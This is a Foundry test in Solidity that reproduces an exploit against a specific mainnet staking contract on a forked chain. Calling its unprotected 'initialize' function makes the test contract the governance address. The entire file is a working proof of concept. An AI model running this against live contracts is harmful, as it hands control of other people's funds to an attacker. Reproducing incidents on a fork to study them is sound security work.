// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

address constant attacker = 0xa0c7BD318D69424603CBf91e9969870F21B8ab4c;
address constant staking = 0xe6D97B2099F142513be7A2a068bE040656Ae4591;

interface IStaking {
    function initialize(address _tokenAddress, address _governanceAddress) external;
    function getGovernanceAddress() external view returns (address);
}

contract AttackContract is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 15_201_793); // Fork mainnet at block 15201793
        vm.label(staking, "Stacking");
        vm.label(address(this), "Attack");
    }

    function testExploit() public {
        console.log("Attack Contract Address: %s", address(this));
        console.log("Governance Address Before Attack: %s", _checkCurrentGovernanceAddress());
        IStaking(staking).initialize(address(this), address(this));
        console.log("Governance Address After Attack: %s", _checkCurrentGovernanceAddress());
    }

    function _checkCurrentGovernanceAddress() internal returns (address) {
        address governanceAddr = IStaking(staking).getGovernanceAddress();
        return governanceAddr;
    }

    function isGovernanceAddress() external view returns (bool) {
        return true;
    }

    receive() external payable {}
}
